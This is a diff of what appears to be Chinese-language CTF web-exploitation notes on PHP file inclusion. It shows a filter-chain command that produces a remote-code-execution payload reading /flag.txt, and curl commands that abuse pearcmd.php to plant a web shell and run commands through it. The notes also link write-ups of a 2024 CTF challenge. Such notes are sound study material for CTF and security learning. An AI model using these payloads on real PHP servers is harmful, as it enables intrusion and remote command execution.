@@ -1530,7 +1530,7 @@ process.mainModule.require("express").response.send=function(){this.end(process.
 <?php
 include $_REQUEST['file'];
 ```
-当可以完全控制require/include的文件名时，就能使用[PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)获取rce payload:`python3 filter_chain.py —-chain '<?php system("cat /flag.txt");?>'`.或者使用pearcmd.php上传木马getshell。参考[Ghazy Corp](https://hackmd.io/@abdinata/Website-Challenge-0xL4ughCTF-2024),控制file_get_contents的文件名也行
+当可以完全控制require/include的文件名时，就能使用[PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)获取rce payload:`python3 filter_chain.py —-chain '<?php system("cat /flag.txt");?>'`。参考[Ghazy Corp](https://hackmd.io/@abdinata/Website-Challenge-0xL4ughCTF-2024),控制file_get_contents的文件名也行。另一篇写的非常详细的[wp](https://siunam321.github.io/ctf/0xL4ugh-CTF-2024/Web/Ghazy-Corp/)。不过这篇wp对file_get_contents的利用比较复杂，不是直接读取文件，而是一点一点像blind oracle一样泄露出来文件内容。或者使用pearcmd.php上传木马getshell：
 ```sh
 curl "http://example.com/?page=/usr/local/lib/php/pearcmd&+-c+/tmp/webshell.php+-d+man_dir=<?echo(system(\$_GET\['cmd'\]));?>+-s+"
 curl "http://example.com/?page=/tmp/webshell&cmd=cat+/flag.txt"
